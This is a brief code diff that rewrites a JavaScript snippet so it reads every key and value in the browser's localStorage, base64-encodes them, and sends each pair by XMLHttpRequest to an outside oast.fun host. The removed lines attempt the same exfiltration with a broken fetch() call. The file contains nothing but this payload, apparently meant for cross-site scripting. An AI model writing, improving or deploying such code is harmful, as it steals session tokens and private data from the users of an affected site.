@@ -1,7 +1,13 @@
-var encodedLocalStorage = {};
-for (var i = 0; i < localStorage.length; i++) {
-  var key = encodeURIComponent(localStorage.key(i));
-  var value = encodeURIComponent(localStorage.getItem(key));
-  encodedLocalStorage[key] = value;
-  fetch('http://cgwqj5g2vtc0000anm5ggeqm3nhyyyyyb.oast.fun/?c='%2BencodedLocalStorage);
+for (let i = 0; i < localStorage.length; i++) {
+  const key = localStorage.key(i);
+  const value = localStorage.getItem(key);
+  const url_encoded_key = encodeURIComponent(key);
+  const url_encoded_value = encodeURIComponent(value);
+  const b64_encoded_key = btoa(url_encoded_key);
+  const b64_encoded_value = btoa(url_encoded_value);
+  // console.log(`${b64_encoded_key}:${b64_encoded_value}`);
+
+  const xhr = new XMLHttpRequest();
+  xhr.open("GET", `https://cgwqj5g2vtc0000anm5ggeqm3nhyyyyyb.oast.fun/?key=${b64_encoded_key}&value=${b64_encoded_value}`, true);
+  xhr.send();
 }
